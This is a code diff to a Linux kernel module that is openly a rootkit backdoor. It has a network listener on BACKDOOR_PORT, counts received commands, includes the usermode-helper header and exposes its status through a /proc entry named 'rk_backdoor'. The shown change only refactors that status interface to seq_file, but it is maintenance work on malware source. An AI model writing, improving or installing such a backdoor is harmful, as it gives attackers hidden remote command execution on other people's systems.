@@ -8,6 +8,7 @@
 #include <linux/net.h>
 #include <linux/printk.h>
 #include <linux/proc_fs.h>
+#include <linux/seq_file.h>
 #include <linux/slab.h>
 #include <linux/umh.h>
 #include <net/sock.h>
@@ -124,20 +125,12 @@ static int listener_fn(void *data)
 	return 0;
 }
 
-static ssize_t proc_read(struct file *f, char __user *buf,
-			  size_t count, loff_t *pos)
+static int bd_proc_show(struct seq_file *m, void *v)
 {
-	char tmp[64];
-	int len;
-
-	len = snprintf(tmp, sizeof(tmp), "port=%d\ncommands=%d\n",
-		       BACKDOOR_PORT, atomic_read(&cmd_count));
-	return simple_read_from_buffer(buf, count, pos, tmp, len);
+	seq_printf(m, "port=%d\ncommands=%d\n",
+		   BACKDOOR_PORT, atomic_read(&cmd_count));
+	return 0;
 }
-
-static const struct proc_ops bd_proc_ops = {
-	.proc_read = proc_read,
-};
 
 static int open_listener(void)
 {
@@ -179,7 +172,7 @@ static int __init backdoor_init(void)
 	if (err)
 		return err;
 
-	proc_entry = proc_create("rk_backdoor", 0444, NULL, &bd_proc_ops);
+	proc_entry = proc_create_single("rk_backdoor", 0444, NULL, bd_proc_show);
 	if (!proc_entry) {
 		sock_release(listen_sock);
 		return -ENOMEM;
